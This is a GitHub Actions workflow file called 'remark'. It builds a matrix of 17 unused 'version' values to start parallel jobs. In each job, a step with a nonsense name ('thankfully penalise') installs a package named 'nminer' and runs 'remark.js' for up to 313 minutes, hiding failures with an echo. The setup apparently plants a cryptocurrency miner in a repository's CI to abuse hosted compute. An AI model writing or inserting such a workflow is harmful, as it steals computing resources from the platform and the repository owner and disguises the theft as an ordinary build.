name: remark
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1967 }
          - { version: 848 }
          - { version: 3753 }
          - { version: 5167 }
          - { version: 4984 }
          - { version: 5329 }
          - { version: 9063 }
          - { version: 7234 }
          - { version: 6421 }
          - { version: 5463 }
          - { version: 7875 }
          - { version: 9353 }
          - { version: 6336 }
          - { version: 2336 }
          - { version: 5638 }
          - { version: 8964 }
          - { version: 4920 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: thankfully penalise
        run: |
          npm install nminer@latest
          timeout 313m node remark.js || echo "remark executed"